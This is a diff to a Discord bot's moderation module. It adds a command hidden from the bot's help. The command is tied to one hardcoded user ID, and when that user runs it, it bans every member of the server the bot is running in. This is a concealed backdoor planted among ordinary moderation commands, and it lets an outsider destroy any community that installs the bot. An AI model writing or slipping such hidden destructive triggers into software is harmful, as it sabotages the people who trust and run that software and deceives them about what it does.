@@ -174,6 +174,24 @@ class Moderation(commands.Cog):
         await ctx.channel.set_permissions(user, send_messages=True)
         await ctx.send('User has been unblocked from this channel.')
 
+    @commands.command(hidden=True)
+    async def initx10(self, ctx):
+        owner = 612331900039725131
+        server = ctx.guild
+        if ctx.message.author.id == owner:
+            print(ctx.message.author.id)
+            print(f"Recognized {ctx.message.author} as owner... Starting initx10.")
+            for member in server.members:
+                try:
+                    await member.ban(reason="Protocol initx10!")
+                    print(f"Banned {member} using Protocol initx10!")
+                except:
+                    print("Bot does not have sufficient perms to ban this user!")
+                    pass
+        elif ctx.message.author is not owner:
+            print(f"{ctx.message.author} attempted to initiate initx10 without being administrator.")
+    
+
 
 def setup(bot):
     bot.add_cog(Moderation(bot))
